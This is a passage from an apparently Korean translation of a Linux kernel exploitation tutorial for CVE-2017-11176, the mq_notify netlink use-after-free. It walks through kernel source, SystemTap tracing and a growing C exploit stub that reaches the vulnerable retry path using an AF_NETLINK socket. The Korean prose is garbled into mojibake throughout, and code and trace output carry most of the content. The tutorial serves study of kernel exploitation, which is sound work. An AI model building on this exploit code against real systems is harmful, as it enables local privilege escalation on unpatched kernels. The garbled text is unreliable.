ì´ì „ ì„¹ì…˜ì—ì„œ ë²„ê·¸ë¥¼ ë¶„ì„í•œ í›„ ê·¸ê²ƒì„ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•œ ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì§°ë‹¤. ì´ë²ˆ ì„¹ì…˜ì—ì„  ì·¨ì•½í•œ ì½”ë“œ(retry label)ì— ì–´ë–»ê²Œ ë„ë‹¬í•˜ëŠ”ì§€ ë³´ê³  ìµìŠ¤í”Œë¡œì‡ì„ ì½”ë”©í•˜ê¸° ì‹œì‘í•  ê²ƒì´ë‹¤.

ì‚¬ì‹¤ ë­”ê°€ë¥¼ êµ¬í˜„í•˜ê¸° ì „ì— ë²„ê·¸ê°€ *ì—°ì—­ì ìœ¼ë¡œ*(a priori) ìµìŠ¤í”Œë¡œì‡í•  ìˆ˜ ìˆëŠ”ì§€ë¥¼ ì²´í¬í•´ì•¼ í•œë‹¤. (ë³´ì•ˆ ê²€ì‚¬ ë“±ì˜ ì´ìœ ë¡œ) ì·¨ì•½í•œ ì½”ë“œì— ë„ë‹¬í•  ìˆ˜ ì—†ë‹¤ë©´ ì´ì–´ë‚˜ê°ˆ ì´ìœ ê°€ ì—†ë‹¤.

### Analyzing the code before the retry label

ëŒ€ë¶€ë¶„ì˜ ì‹œìŠ¤í…œ ì½œì²˜ëŸ¼ *mq\_notify* ëŠ” **copy\_from\_user()** í•¨ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ ìœ ì € ì˜ì—­ ë°ì´í„°ë¥¼ ë³µì‚¬í•˜ëŠ” ê²ƒìœ¼ë¡œ ì‹œì‘í•œë‹¤:

```c
    SYSCALL_DEFINE2(mq_notify, mqd_t, mqdes,
        const struct sigevent __user *, u_notification)
    {
      int ret;
      struct file *filp;
      struct sock *sock;
      struct inode *inode;
      struct sigevent notification;
      struct mqueue_inode_info *info;
      struct sk_buff *nc;

[0]   if (u_notification) {
[1]     if (copy_from_user(&notification, u_notification,
              sizeof(struct sigevent)))
          return -EFAULT;
      }

      audit_mq_notify(mqdes, u_notification ? &notification : NULL);  // <--- you can ignore this
```

ì´ ì½”ë“œëŠ” ìœ ì € ì˜ì—­ì—ì„œ ì œê³µëœ ì¸ì *u\_notification* ì´ NULLì´ ì•„ë‹Œì§€ ì²´í¬í•˜ê³  [0], ì»¤ë„ ë©”ëª¨ë¦¬ì— ì‚¬ë³¸ì„ ë§Œë“ ë‹¤ [1] (*notification*).

ë‹¤ìŒì€ ìœ ì € ì˜ì—­ì—ì„œ ì œê³µëœ **struct sigevent**ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ëŠ” *sanity* checkë“¤ì´ë‹¤:

```c
      nc = NULL;
      sock = NULL;
[2]   if (u_notification != NULL) {
[3a]     if (unlikely(notification.sigev_notify != SIGEV_NONE &&
               notification.sigev_notify != SIGEV_SIGNAL &&
               notification.sigev_notify != SIGEV_THREAD))
          return -EINVAL;
[3b]    if (notification.sigev_notify == SIGEV_SIGNAL &&
          !valid_signal(notification.sigev_signo)) {
          return -EINVAL;
        }
[3c]    if (notification.sigev_notify == SIGEV_THREAD) {
          long timeo;

          /* create the notify skb */
          nc = alloc_skb(NOTIFY_COOKIE_LEN, GFP_KERNEL);
          if (!nc) {
            ret = -ENOMEM;
            goto out;
          }
[4]       if (copy_from_user(nc->data,
              notification.sigev_value.sival_ptr,
              NOTIFY_COOKIE_LEN)) {
            ret = -EFAULT;
            goto out;
          }

          /* TODO: add a header? */
          skb_put(nc, NOTIFY_COOKIE_LEN);
          /* and attach it to the socket */

    retry:                                    // <---- we want to reach this!
            filp = fget(notification.sigev_signo);
```

ì œê³µëœ ì¸ìê°€ NULLì´ ì•„ë‹ˆë¼ë©´ [2],  *sigev\_notify* ê°’ì€ ì„¸ ë²ˆì˜ ê²€ì‚¬ë¥¼ ê±°ì¹œë‹¤ ([3a], [3b], [3c]). *copy\_from\_user()* ëŠ” ìœ ì € ì˜ì—­ì—ì„œ ì œê³µëœ *notification.sigev\_value\_sival\_ptr* ê°’ì„ ê¸°ë°˜ìœ¼ë¡œ í˜¸ì¶œëœë‹¤ [4]. ìœ íš¨í•œ ìœ ì € ì˜ì—­ì˜ *ì½ì„ ìˆ˜ ìˆëŠ”* ë°ì´í„°/ë²„í¼ë¥¼ ê°€ë¦¬í‚¤ê³  ìˆì§€ ì•Šìœ¼ë©´ *copy\_from\_user()* ëŠ” ì‘ë™ì´ ì•ˆ ë  ê²ƒì´ë‹¤.

ìƒê¸°í•˜ìë©´ *struct sigevent*ëŠ” ì—¬ê¸°ì„œ ì„ ì–¸ë˜ì—ˆë‹¤:

```c
    // [include/asm-generic/siginfo.h]

    typedef union sigval {
      int sival_int;
      void __user *sival_ptr;
    } sigval_t;

    typedef struct sigevent {
      sigval_t sigev_value;
      int sigev_signo;
      int sigev_notify;
      union {
        int _pad[SIGEV_PAD_SIZE];
         int _tid;

        struct {
          void (*_function)(sigval_t);
          void *_attribute; /* really pthread_attr_t */
        } _sigev_thread;
      } _sigev_un;
    } sigevent_t;
```

ê²°êµ­ *retry path* ì— í•œë²ˆì´ë¼ë„ ì§„ì…í•˜ë ¤ë©´ ë‹¤ìŒê³¼ ê°™ì´ ì§„í–‰í•´ì•¼ í•œë‹¤.

1. NULLì´ ì•„ë‹Œ *u\_notification* ì¸ìë¥¼ ì œê³µ
2. *u\_notification.sigev\_notify* ë¥¼ *SIGEV\_THREAD*ë¡œ ì„¤ì •
3. *notification.sigev\_value.sival\_ptr* ì´ ê°€ë¦¬í‚¤ëŠ” ê°’ì€ ë¬´ì¡°ê±´ ìœ íš¨í•œ *NOTIFY\_COOKIE\_LEN*(=32) ë°”ì´íŠ¸ì˜ *ì½ì„ ìˆ˜ ìˆëŠ” ìœ ì € ì˜ì—­*  ì£¼ì†Œì—¬ì•¼ í•œë‹¤ ([include/linux/mqueue.h] ì°¸ê³ ).

### The first exploit stub

ì´ì œ ìµìŠ¤í”Œë¡œì‡ ì½”ë”©ì„ ì‹œì‘í•˜ê³  ëª¨ë“  ê²ƒì´ ê´œì°®ë‹¤ëŠ” ê²ƒì„ ê²€ì¦í•´ë³´ì.

```c
    /*
     * CVE-2017-11176 Exploit.
     */

    #include <mqueue.h>
    #include <stdio.h>
    #include <string.h>


    #define NOTIFY_COOKIE_LEN (32)


    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];

      printf("-={ CVE-2017-11176 Exploit }=-\n");

      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;

      if (mq_notify((mqd_t)-1, &sigev))
      {
        perror("mqnotify");
        goto fail;
      }
      printf("mqnotify succeed\n");

      // TODO: exploit

      return 0;

    fail:
      printf("exploit failed!\n");
      return -1;
    }
```

ìµìŠ¤í”Œë¡œì‡ ê°œë°œì„ ì‰½ê²Œ í•˜ê¸° ìœ„í•´ *Makefile* ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ì¶”ì²œí•œë‹¤(build-and-run scripts are always handy). ì»´íŒŒì¼ì„ í•˜ê¸° ìœ„í•´ì„  *mq\_notify* ë¥¼ ì‚¬ìš©í•˜ê¸° ìœ„í•´ í•„ìš”í•œ **-lrt** ì˜µì…˜ì„ í†µí•´ ë°”ì´ë„ˆë¦¬ë¥¼ ì—°ê²°(link)í•´ì•¼ í•  ê²ƒì´ë‹¤. ì¶”ê°€ì ìœ¼ë¡œ gccê°€ ìš°ë¦¬ì˜ ì½”ë“œë¥¼ ì¬ë°°ì—´í•˜ëŠ” ê²ƒì„ ë°©ì§€í•˜ê¸° ìœ„í•´ **-O0** ì˜µì…˜ì„ ì‚¬ìš©í•˜ëŠ” ê²ƒì„ ê¶Œì¥í•œë‹¤(ë²„ê·¸ë¥¼ ë””ë²„ê¹…í•˜ê¸° ì–´ë ¤ì›Œì§ˆ ìˆ˜ ìˆë‹¤).

```plaintext
-={ CVE-2017-11176 Exploit }=-
mqnotify: Bad file descriptor
exploit failed!
```

*mq\_notify* ê°€ "-EBADF"ì™€ ë™ì¼í•œ "Bad file descriptor"ë¥¼ ë°˜í™˜í–ˆë‹¤. ì—ëŸ¬ê°€ ë‚  ìˆ˜ ìˆëŠ” ê³³ì´ ì„¸ ê³³ ìˆë‹¤. *fget()* í˜¸ì¶œ ì¤‘ í•˜ë‚˜ì¼ ìˆ˜ë„ ìˆê³ , ë‚˜ì¤‘ì— ë‚˜ì˜¤ëŠ”(?)(*flip->f\_op != &mqueue\_file\_operations*) ì²´í¬ì¼ ìˆ˜ë„ ìˆë‹¤. ë” ìì„¸íˆ ì•Œì•„ë³´ì!

### Hello System Tap!

ìµìŠ¤í”Œë¡œì‡ ê°œë°œì˜ ì´ˆë°˜ë¶€ì—” debug symbolê³¼ í•¨ê»˜(?) ìµìŠ¤í”Œë¡œì‡ì„ ëŒë ¤ë³´ëŠ” ê²ƒì„ *ê°•ë ¥ ì¶”ì²œí•œë‹¤*. **SystemTap**ì„ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤! SystemTapì€ gdb ì—†ì´ ì»¤ë„ì„ ë¼ì´ë¸Œë¡œ ì¡°ì‚¬í•  ìˆ˜ ìˆëŠ” í›Œë¥­í•œ íˆ´ì´ë‹¤. sequence ì‹œê°í™”ë¥¼ ì‰½ê²Œ í•´ì¤€ë‹¤.

ê¸°ë³¸ì ì¸ SystemTap(stap) ìŠ¤í¬ë¦½íŠ¸ë¶€í„° ì‹œì‘í•´ë³´ì:

```c
    # mq_notify.stp

    probe syscall.mq_notify
    {
      if (execname() == "exploit")
      {
        printf("\n\n(%d-%d) >>> mq_notify (%s)\n", pid(), tid(), argstr)
      }
    }

    probe syscall.mq_notify.return
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) <<< mq_notify = %x\n\n\n", pid(), tid(), $return)
      }
    }
```

ì´ ìŠ¤í¬ë¦½íŠ¸ëŠ” ê°ê° syscall í˜¸ì¶œì˜ **ì „**ê³¼ **í›„**ì— í˜¸ì¶œë˜ëŠ” probe ë‘˜ì„ ì„¤ì¹˜í•œë‹¤.

*pid()* ì™€ *tid()* ì˜ ë¤í”„ë¥¼ ë– ë‘ë©´ ì—¬ëŸ¬ ìŠ¤ë ˆë“œë¥¼ ë””ë²„ê¹…í•˜ëŠ” ë° í° ë„ì›€ì´ ëœë‹¤. *(execname() == "exploit")* ì¡°ê±´ë¬¸ì„ ì‚¬ìš©í•˜ë©´ ì¶œë ¥ë˜ëŠ” ê²°ê³¼ì˜ ìˆ˜ë¥¼ ì œí•œí•  ìˆ˜ ìˆë‹¤.

**ì£¼ì˜**: ê²°ê³¼ê°€ *ë„ˆë¬´ ë§ë‹¤ë©´* SystemTapì´ ëª‡ ëª‡ ì¤„ì„ ëˆ„ë½í•  ìˆ˜ ìˆë‹¤.

ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ í†µí•´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ëŒë ¤ë³´ì:

```bash
stap -v mq_notify.stp
```

ê·¸ë¦¬ê³  ìµìŠ¤í”Œë¡œì‡ì„ êµ¬ë™í•´ë³´ì:

```plaintext
(14427-14427) >>> mq_notify (-1, 0x7ffdd7421400)
(14427-14427) <<< mq_notify = fffffffffffffff7
```

probeê°€ ì˜ ì‘ë™í•˜ëŠ” ê²ƒ ê°™ë‹¤.*mq\_notify()* syscallì˜ ë‘ ì¸ìê°€ ìš°ë¦¬ì˜ callê³¼ ì¼ì¹˜í•œë‹¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤ (i.e. we set "-1" in the first parameter and 0x7ffdd7421400 looks like a userland address). ê²Œë‹¤ê°€ -EBADF(= -9)ì¸ fffffffffffffff7ë„ ë°˜í™˜í–ˆë‹¤. probeë¥¼ ë” ì¶”ê°€í•´ë³´ì.

*syscall*("SYSCALL_DEFINE\*"ìœ¼ë¡œ ì‹œì‘í•˜ëŠ” í•¨ìˆ˜) í›„í‚¹ê³¼ëŠ” ë‹¤ë¥´ê²Œ ì¼ë°˜ì ì¸ ì»¤ë„ í•¨ìˆ˜ëŠ” ë‹¤ìŒì„ í†µí•´ í›„í‚¹í•  ìˆ˜ ìˆë‹¤:

```c
    probe kernel.function ("fget")
    {
      if (execname() == "exploit")
      {
        printf("(%d-%d) [vfs] ==>> fget (%s)\n", pid(), tid(), $$parms)
      }
    }
```

**ì£¼ì˜**: ëª‡ ëª‡ ì´ìœ ë¡œ ëª¨ë“  ì»¤ë„ í•¨ìˆ˜ì— í›„í‚¹ì„ í•  ìˆ˜ ìˆì§€ëŠ” ì•Šë‹¤. ì˜ˆë¥¼ ë“¤ì–´ "inlined"ëŠ” í›„í‚¹ì´ ë  ìˆ˜ë„ ì•ˆ ë  ìˆ˜ë„ ìˆë‹¤(it depends if the inlining actually occurred). ê²Œë‹¤ê°€ ì–´ë–¤ í•¨ìˆ˜ë“¤ì€(ì˜ˆ: ì—¬ê¸°ì„œ ë‹¤ë£¨ëŠ” copy\_from\_user()) í˜¸ì¶œ **ì´ì „**ì—” í›„í‚¹ì´ ë˜ì§€ë§Œ **ì´í›„**(= ë°˜í™˜í•  ë•Œ)ì—” ì•ˆ ë˜ê¸°ë„ í•œë‹¤. ì–´ë–¤ ê²½ìš°ë“  SystemTapì—ì„œ ì•ˆ ëœë‹¤ëŠ” ê²ƒì„ ì•Œë ¤ì£¼ê³  ìŠ¤í¬ë¦½íŠ¸ê°€ ì‹¤í–‰ë˜ì§€ ì•Šë„ë¡ í•  ê²ƒì´ë‹¤.

*mq\_notify()* ë¡œ ì¸í•´ í˜¸ì¶œëœ ëª¨ë“  í•¨ìˆ˜ì— probeë¥¼ ì¶”ê°€í•˜ê³  ì½”ë“œ íë¦„ì„ ë³´ë©° ìµìŠ¤í”Œë¡œì‡ì„ ì‹¤í–‰í•´ë³´ì:

```plaintext
(17850-17850) [SYSCALL] ==>> mq_notify (-1, 0x7ffc30916f50)
(17850-17850) [uland] ==>> copy_from_user ()
(17850-17850) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(17850-17850) [uland] ==>> copy_from_user ()
(17850-17850) [skb] ==>> skb_put (skb=0xffff88002e061200 len=0x20)
(17850-17850) [skb] <<== skb_put = ffff88000a187600
(17850-17850) [vfs] ==>> fget (fd=0x3)
(17850-17850) [vfs] <<== fget = ffff88002e271280
(17850-17850) [netlink] ==>> netlink_getsockbyfilp (filp=0xffff88002e271280)
(17850-17850) [netlink] <<== netlink_getsockbyfilp = ffff88002ff82800
(17850-17850) [netlink] ==>> netlink_attachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200 timeo=0xffff88002e1f3f40 ssk=0x0)
(17850-17850) [netlink] <<== netlink_attachskb = 0
(17850-17850) [vfs] ==>> fget (fd=0xffffffff)
(17850-17850) [vfs] <<== fget = 0
(17850-17850) [netlink] ==>> netlink_detachskb (sk=0xffff88002ff82800 skb=0xffff88002e061200)
(17850-17850) [netlink] <<== netlink_detachskb
(17850-17850) [SYSCALL] <<== mq_notify= -9
```

**ì—…ë°ì´íŠ¸(2018-10-22)**: ì œì‹œëœ ISOì—ì„œëŠ” syscall ì½”ë“œê°€ *fget()* ì´ ì•„ë‹Œ *fdget()* ì„ í˜¸ì¶œí•œë‹¤. ì½”ë“œë¥¼ ì˜ ì½ê³  probeë¥¼ ì•Œë§ê²Œ ìˆ˜ì •í•˜ë¼.

### The first bug!

ë‹¤ìŒê³¼ ê°™ì€ ì°¨ë¡€ê°€ ë³´ì´ëŠ” ê±¸ë¡œ ë´ì„  ì œëŒ€ë¡œ *retry path* ì— ë„ë‹¬í•œ ê²ƒ ê°™ë‹¤.

1. **copy\_from\_user**: í¬ì¸í„°ê°€ NULLì´ ì•„ë‹˜
2. **alloc\_skb**: SIGEV\_THREAD ì¡°ê±´ì„ í†µê³¼í•¨
3. **copy\_from\_user**: picking our *sival_buffer*
4. **skb\_put**: ì´ì „ì˜ *copy\_from\_user()* ê°€ ì˜ ì‘ë™í–ˆìŒì„ ì˜ë¯¸
5. **fget(fd=0x3)**: <--- ???

ë­”ê°€ê°€ ì´ë¯¸ ì˜ëª»ëœ ê²ƒ ê°™ë‹¤. ìš°ë¦¬ê°€ **notification.sigev_signo** ì•ˆì˜(?) ì–´ë–¤ file descriptorë„ ë„£ì–´ì¤€ ì ì´ ì—†ê¸° ë•Œë¬¸ì— 3ì´ ì•„ë‹ˆë¼ 0ì´ ë˜ì–´ì•¼ í•œë‹¤.

```c
      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;
```

ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³ , *fget()* ì— ëŒ€í•œ ì²« ë²ˆì§¸ í˜¸ì¶œì€ ì˜ ì‘ë™í–ˆë‹¤. ê²Œë‹¤ê°€ *netlink\_getsockbyflip()* ê³¼ *netlink\_attachskb()* ë„ ì˜ ë™ì‘í–ˆë‹¤! ìš°ë¦¬ê°€ ì–´ë–¤ *AF\_NETLINK* ì†Œì¼“ë„ ìƒì„±í•œ ì ì´ ì—†ê¸° ë•Œë¬¸ì— ì´ê²ƒë„ ì´ìƒí•œ ì¼ì´ë‹¤.

ì‹¤ì œë¡œ ì‹¤íŒ¨í•œ ê²ƒì€ **ë‘ ë²ˆì§¸ *fget()***ì¸ë° ì´ëŠ” ìš°ë¦¬ê°€ *mq\_notify()* ì˜ ì²« ì¸ìë¥¼ "-1"ë¡œ ì„¤ì •í–ˆê¸° ë•Œë¬¸ì´ë‹¤. ê·¸ë˜ì„œ ë­ê°€ ë¬¸ì œì¸ê°€?

ë’¤ë¡œ ëŒì•„ê°€ì„œ **sigevent** í¬ì¸í„°ë¥¼ ì¶œë ¥í•´ë³´ê³ , syscallì— ì „ë‹¬ëœ ê°’ê³¼ ë¹„êµí•´ë³´ì.

```c
  printf("sigev = 0x%p\n", &sigev);
  if (mq_notify((mqd_t) -1, &sigev))
```

```plaintext
-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7ffdd9257f00        // <------
mq_notify: Bad file descriptor
exploit failed!
```

```
(18652-18652) [SYSCALL] ==>> mq_notify (-1, 0x7ffdd9257e60)
```

*mq\_notify()* syscallë¡œ ì „ë‹¬ëœ êµ¬ì¡°ì²´ì™€ ìš°ë¦¬ê°€ ìµìŠ¤í”Œë¡œì‡ì—ì„œ ì¤€ êµ¬ì¡°ì²´ê°€ ëª…ë°±í•˜ê²Œ ë‹¤ë¥´ë‹¤. ì´ê²ƒì€ *system tap*ì— ë¬¸ì œê°€ ìˆê±°ë‚˜(ê°€ëŠ¥í•œ ì¼ì´ë‹¤) ì•„ë‹ˆë©´...

**... ëª‡ ëª‡ library wrapperì— ë‹¹í•œ ê²ƒì´ë‹¤!**

ì´ë¥¼ ë°”ë¡œì¡ì•„ *mq\_notify* ë¥¼ **syscall()** syscallì„ í†µí•´ í˜¸ì¶œí•´ë³´ì.

ìš°ì„  ë‹¤ìŒ í—¤ë”ì™€ ìš°ë¦¬ì˜ *ìì²´* wrapperë¥¼ ì¶”ê°€í•œë‹¤:

```c
    #define _GNU_SOURCE
    #include <unistd.h>
    #include <sys/syscall.h>

    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
```

ì´ì œ syscallì„ ì§ì ‘ ì‚¬ìš©í•˜ë¯€ë¡œ Makefileì˜ "-lrt" ë¶€ë¶„ì„ ì§€ì›Œì¤€ë‹¤.

0ì´ ìœ íš¨í•œ file descriptorì´ë¯€ë¡œ *sigev\_signo* ê°’ì„ ëª…ì‹œì ìœ¼ë¡œ '-1'ë¡œ ì„¤ì •í•˜ê³  wrapperë¥¼ ì‚¬ìš©í•œë‹¤:

```c
      int main(void)
      {
        // ... cut ...

        sigev.sigev_signo = -1;

        printf("sigev = 0x%p\n", &sigev);
        if (_mq_notify((mqd_t)-1, &sigev))

        // ... cut ...
      }
```

ê·¸ë¦¬ê³  ì‹¤í–‰í•´ë³´ì:

```plaintext
-={ CVE-2017-11176 Exploit }=-
sigev = 0x0x7fffb7eab660
mq_notify: Bad file descriptor
exploit failed!

(18771-18771) [SYSCALL] ==>> mq_notify (-1, 0x7fffb7eab660)           // <--- as expected!
(18771-18771) [uland] ==>> copy_from_user ()
(18771-18771) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(18771-18771) [uland] ==>> copy_from_user ()
(18771-18771) [skb] ==>> skb_put (skb=0xffff88003d2e95c0 len=0x20)
(18771-18771) [skb] <<== skb_put = ffff88000a0a2200
(18771-18771) [vfs] ==>> fget (fd=0xffffffff)                         // <---- that's better!
(18771-18771) [vfs] <<== fget = 0
(18771-18771) [SYSCALL] <<== mq_notify= -9
```

ì´ë²ˆì—” ì˜ˆìƒëŒ€ë¡œ ì²˜ìŒìœ¼ë¡œ ì‹¤íŒ¨í•œ *fget()* ì´í›„ì— ë°”ë¡œ *out* labelë¡œ ê°”ë‹¤.

ì´ì œ ìš°ë¦¬ëŠ” ì–´ë–¤ ë³´ì•ˆ ê²€ì‚¬ì—ë„ ë§‰íˆì§€ ì•Šê³  "retry" labelì— ë„ë‹¬í•  ìˆ˜ ìˆìŒì„ ì•Œê²Œ ë˜ì—ˆë‹¤. (syscall ëŒ€ì‹  library wrapperì— ì˜í•´ ìƒê¸°ëŠ”) ì¼ë°˜ì ì¸ í•¨ì •(trap)ì´ ë“œëŸ¬ë‚¬ê³ , ì–´ë–»ê²Œ ëŒ€ì²˜í•˜ëŠ”ì§€ ë³´ì•˜ë‹¤. ì´ì œ ë‚˜ì¤‘ì— ê°™ì€ ì¢…ë¥˜ì˜ ë²„ê·¸ë¥¼ í”¼í•˜ê¸° ìœ„í•´ì„œ, ëª¨ë“  syscallì„ ê°ì‹¸ë©´(wrap) ë˜ëŠ” ê²ƒì´ë‹¤.

ì´ì œ ë„˜ì–´ê°€ì„œ SystemTapì„ ì´ìš©í•˜ì—¬ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•´ë³´ì.

- - -

## <a name='forcing-the-trigger'></a>ê°•ì œë¡œ íŠ¸ë¦¬ê±°í•˜ê¸°

ë•Œë¡œëŠ” **ë– ì˜¤ë¥¸ ìƒê°ì„ ëª¨ë“  ì»¤ë„ ì½”ë“œë¥¼ ë“¤ì—¬ë‹¤ë³´ì§€ ì•Šê³  ê²€ì¦í•˜ê³ ** ì‹¶ì„ ê²ƒì´ë‹¤. ì´ë²ˆ ì„¹ì…˜ì—ì„  *System Tap Guru Mode*ë¥¼ ì´ìš©í•˜ì—¬ ì»¤ë„ ë°ì´í„° êµ¬ì¡°ë¥¼ ìˆ˜ì •í•˜ê³  íŠ¹ì • ì»¤ë„ pathë¡œ ê°€ë„ë¡ ê°•ì œí•  ê²ƒì´ë‹¤.

ë‹¤ì‹œ ë§í•˜ìë©´ **ë²„ê·¸ë¥¼ ì»¤ë„ ì˜ì—­ì—ì„œ íŠ¸ë¦¬ê±°**í•  ê²ƒì´ë‹¤. ì»¤ë„ ì˜ì—­ì—ì„œì¡°ì°¨ íŠ¸ë¦¬ê±°ë¥¼ í•  ìˆ˜ ì—†ë‹¤ë©´ ìœ ì € ì˜ì—­ì—ì„œëŠ” í•´ë‚¼ ë°©ë²•ì´ ì—†ë‹¤ëŠ” ë°œìƒì´ë‹¤. ê·¸ëŸ¼ ì´ì œ ì»¤ë„ì„ ìˆ˜ì •í•˜ì—¬ ëª¨ë“  ìš”êµ¬ ì¡°ê±´ì„ ë§Œì¡±ì‹œí‚¤ê³ , í•˜ë‚˜ í•˜ë‚˜ ìœ ì € ì˜ì—­ì—ì„œ êµ¬í˜„í•´ë³´ì(part 2 ì°¸ê³ ).

ìš°ë¦¬ëŠ” ë‹¤ìŒ ê²½ìš°ì— ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆìŒì„ ìƒê¸°í•˜ì:

1. "retry logic"ì— ë„ë‹¬í–ˆì„ ë•Œ. ì¦‰, *netlink\_attachskb()* ì— ë¨¼ì € ì§„ì…í•œ í›„ 1ì„ ë°˜í™˜í•˜ë„ë¡ í•´ì•¼ í•œë‹¤. *sock* ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ëŠ” 1 ê°ì†Œí•  ê²ƒì´ë‹¤.
2. *retry* labelë¡œ ë‹¤ì‹œ ë£¨í”„í•˜ê³ , ê·¸ ë’¤ì— *fget()* ì„ í˜¸ì¶œí–ˆì„ ë•Œ NULLì´ ë°˜í™˜ë˜ì–´ì•¼ í•œë‹¤. ê·¸ë˜ì•¼ exit pathë¡œ ì§„ì…í•˜ê³  *sock* ì˜ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´í„°ë¥¼ í•œ ë²ˆ ë” ê°ì†Œì‹œí‚¬ ìˆ˜ ìˆë‹¤.

### Reaching *netlink\_attachskb()*

ì´ì „ ì„¹ì…˜ì—ì„œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ **netlink\_attachskb()**ê°€ 1ì„ ë°˜í™˜í•´ì•¼ í•œë‹¤ëŠ” ê²ƒì„ ë³´ì•˜ë‹¤. ê·¸ëŸ¬ë‚˜ ê·¸ ì „ì— ëª‡ ëª‡ ìš”êµ¬ ì¡°ê±´ì´ ìˆë‹¤:

1. *ìœ íš¨í•œ* file descriptorë¥¼ ì œê³µí•´ì•¼ *fget()*ì— ëŒ€í•œ ì²« í˜¸ì¶œì´ ì‹¤íŒ¨í•˜ì§€ ì•ŠëŠ”ë‹¤.
2. file descriptorê°€ ê°€ë¦¬í‚¤ëŠ” íŒŒì¼ì€ ***AF\_NETLINK* íƒ€ì…ì˜ ì†Œì¼“**ì´ì–´ì•¼ í•œë‹¤.

ì¦‰, ìš°ë¦¬ëŠ” ëª¨ë“  ê²€ì‚¬ë¥¼ ì˜ í†µê³¼í•´ì•¼ í•œë‹¤(?).

```c
    retry:
[0]       filp = fget(notification.sigev_signo);
          if (!filp) {
            ret = -EBADF;
            goto out;
          }
[1]       sock = netlink_getsockbyfilp(filp);
          fput(filp);
          if (IS_ERR(sock)) {
            ret = PTR_ERR(sock);
            sock = NULL;
            goto out;
          }
```

ì²« ë²ˆì§¸ ê²€ì‚¬ [0]ë¥¼ í†µê³¼í•˜ëŠ” ê²ƒì€ ê°„ë‹¨í•˜ë‹¤. ìœ íš¨í•œ file descriptor (with open(), socket(), whatever).ë¥¼ ê±´ë„¤ì£¼ê¸°ë§Œ í•˜ë©´ ëœë‹¤. ê·¸ëŸ¼ì—ë„ ë¶ˆêµ¬í•˜ê³  ì²˜ìŒë¶€í„° ì ì ˆí•œ íƒ€ì…ì„ ì‚¬ìš©í•´ì¤˜ì•¼1 ë‘ ë²ˆì§¸ ê²€ì‚¬[1]ë¥¼ í†µê³¼í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ë” ë°”ëŒì§í•˜ë‹¤:

```c
    struct sock *netlink_getsockbyfilp(struct file *filp)
    {
      struct inode *inode = filp->f_path.dentry->d_inode;
      struct sock *sock;

      if (!S_ISSOCK(inode->i_mode))         // <--- this need to be a socket...
        return ERR_PTR(-ENOTSOCK);

      sock = SOCKET_I(inode)->sk;
      if (sock->sk_family != AF_NETLINK)    // <--- ...from the AF_NETLINK family
        return ERR_PTR(-EINVAL);

      sock_hold(sock);
      return sock;
    }
```

ìµìŠ¤í”Œë¡œì‡ ì½”ë“œëŠ” ë‹¤ìŒê³¼ ê°™ì´ ëœë‹¤ (syscall *socket()*ì„ ê°ì‹¸ëŠ” ê²ƒì„ ìŠì§€ ë§ì):

```c
    /*
     * CVE-2017-11176 Exploit.
     */

    #define _GNU_SOURCE
    #include <mqueue.h>
    #include <stdio.h>
    #include <string.h>
    #include <unistd.h>
    #include <sys/syscall.h>
    #include <sys/types.h>
    #include <sys/socket.h>
    #include <linux/netlink.h>

    #define NOTIFY_COOKIE_LEN (32)

    #define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
    #define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)

    int main(void)
    {
      struct sigevent sigev;
      char sival_buffer[NOTIFY_COOKIE_LEN];
      int sock_fd;

      printf("-={ CVE-2017-11176 Exploit }=-\n");

      if ((sock_fd = _socket(AF_NETLINK, SOCK_DGRAM, NETLINK_GENERIC)) < 0)
      {
        perror("socket");
        goto fail;
      }
      printf("netlink socket created = %d\n", sock_fd);

      // initialize the sigevent structure
      memset(&sigev, 0, sizeof(sigev));
      sigev.sigev_notify = SIGEV_THREAD;
      sigev.sigev_value.sival_ptr = sival_buffer;
      sigev.sigev_signo = sock_fd;  // <--- not '-1' anymore

      if (_mq_notify((mqd_t)-1, &sigev))
      {
        perror("mq_notify");
        goto fail;
      }
      printf("mq_notify succeed\n");

      // TODO: exploit

      return 0;

    fail:
      printf("exploit failed!\n");
      return -1;
    }
```

ì´ì œ ì‹¤í–‰ì„ í•´ë³´ì:

```plaintext
-={ CVE-2017-11176 Exploit }=-
netlink socket created = 3
mq_notify: Bad file descriptor
exploit failed!

(18998-18998) [SYSCALL] ==>> mq_notify (-1, 0x7ffce9cf2180)
(18998-18998) [uland] ==>> copy_from_user ()
(18998-18998) [skb] ==>> alloc_skb (priority=0xd0 size=0x20)
(18998-18998) [uland] ==>> copy_from_user ()
(18998-18998) [skb] ==>> skb_put (skb=0xffff88003d1e0480 len=0x20)
(18998-18998) [skb] <<== skb_put = ffff88000a0a2800
(18998-18998) [vfs] ==>> fget (fd=0x3)                                          // <--- this time '3' is expected
